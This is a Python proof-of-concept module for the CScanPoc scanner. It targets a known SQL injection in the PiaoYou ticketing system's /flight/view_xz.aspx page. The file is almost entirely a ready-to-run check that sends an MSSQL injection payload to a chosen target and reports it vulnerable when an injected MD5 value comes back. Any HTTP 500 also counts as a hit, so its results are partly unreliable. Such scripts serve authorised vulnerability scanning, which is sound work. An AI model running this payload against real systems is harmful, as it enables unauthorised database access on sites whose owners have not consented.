# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0017' # 平台漏洞编号，留空
    name = '票友系统一处通用SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-27'  # 漏洞公布时间
    desc = '''
        票友系统一处通用SQL注入漏洞：
        /flight/view_xz.aspx?a=1+and+1=
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0128323
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'PiaoYou_0017' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/flight/view_xz.aspx?a=1+and+1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 or code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res :
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()